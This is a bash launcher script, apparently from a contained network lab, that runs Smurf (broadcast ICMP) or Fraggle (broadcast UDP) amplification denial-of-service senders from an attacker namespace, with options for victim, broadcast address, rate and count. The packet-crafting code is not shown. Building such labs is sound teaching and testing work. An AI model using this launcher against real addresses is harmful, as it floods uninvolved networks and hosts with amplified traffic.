#!/usr/bin/env bash
# run_attack.sh — launch a hand-crafted sender inside the attacker namespace.
#
#   sudo bash run_attack.sh [--proto icmp|udp] [--engine py|c]
#                           [--count N] [--rate PPS] [--size B]
#                           [--victim IP] [--broadcast IP]
#                           [--dport P] [--sport P]      # udp/fraggle only
#
#   --proto icmp   the classic Smurf: broadcast ICMP echo request  (smurf.{py,c})
#   --proto udp    the Fraggle variant: broadcast UDP echo request  (fraggle.{py,c})
#
# Defaults come from lab.env (victim=$VICTIM_IP, broadcast=$AMP_BCAST,
# dport=$FRAGGLE_PORT, sport=$FRAGGLE_SPORT).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lab.env
source "$SCRIPT_DIR/lab.env"

if [ "$(id -u)" -ne 0 ]; then exec sudo -E bash "$0" "$@"; fi

PROTO=icmp
ENGINE=py
COUNT=100
RATE=50
SIZE=0
VICTIM="$VICTIM_IP"
BCAST="$AMP_BCAST"
DPORT="$FRAGGLE_PORT"
SPORT="$FRAGGLE_SPORT"

while [ $# -gt 0 ]; do
  case "$1" in
    --proto)     PROTO="$2";  shift 2;;
    --engine)    ENGINE="$2"; shift 2;;
    --count)     COUNT="$2";  shift 2;;
    --rate)      RATE="$2";   shift 2;;
    --size)      SIZE="$2";   shift 2;;
    --victim)    VICTIM="$2"; shift 2;;
    --broadcast) BCAST="$2";  shift 2;;
    --dport)     DPORT="$2";  shift 2;;
    --sport)     SPORT="$2";  shift 2;;
    *) echo "unknown option: $1" >&2; exit 2;;
  esac
done

# build_c <src-basename> -> ensures $SCRIPT_DIR/src/<name> is built and up to date
build_c() {
  local name="$1" bin="$SCRIPT_DIR/src/$1" src="$SCRIPT_DIR/src/$1.c"
  if [ ! -x "$bin" ] || [ "$src" -nt "$bin" ]; then
    echo "[*] Building $name.c ..." >&2   # keep stdout clean: only the path is returned
    gcc -O2 -Wall -o "$bin" "$src" >&2
  fi
  printf '%s' "$bin"
}

case "$PROTO" in
  icmp)
    case "$ENGINE" in
      py) ip netns exec attacker python3 "$SCRIPT_DIR/src/smurf.py" \
            --victim "$VICTIM" --broadcast "$BCAST" \
            --count "$COUNT" --rate "$RATE" --size "$SIZE" ;;
      c)  BIN="$(build_c smurf)"
          ip netns exec attacker "$BIN" "$VICTIM" "$BCAST" "$RATE" "$COUNT" "$SIZE" ;;
      *)  echo "unknown engine: $ENGINE (use py or c)" >&2; exit 2;;
    esac ;;
  udp)
    case "$ENGINE" in
      py) ip netns exec attacker python3 "$SCRIPT_DIR/src/fraggle.py" \
            --victim "$VICTIM" --broadcast "$BCAST" --dport "$DPORT" --sport "$SPORT" \
            --count "$COUNT" --rate "$RATE" --size "$SIZE" ;;
      c)  BIN="$(build_c fraggle)"
          ip netns exec attacker "$BIN" "$VICTIM" "$BCAST" "$DPORT" "$SPORT" "$RATE" "$COUNT" "$SIZE" ;;
      *)  echo "unknown engine: $ENGINE (use py or c)" >&2; exit 2;;
    esac ;;
  *)
    echo "unknown proto: $PROTO (use icmp or udp)" >&2; exit 2;;
esac
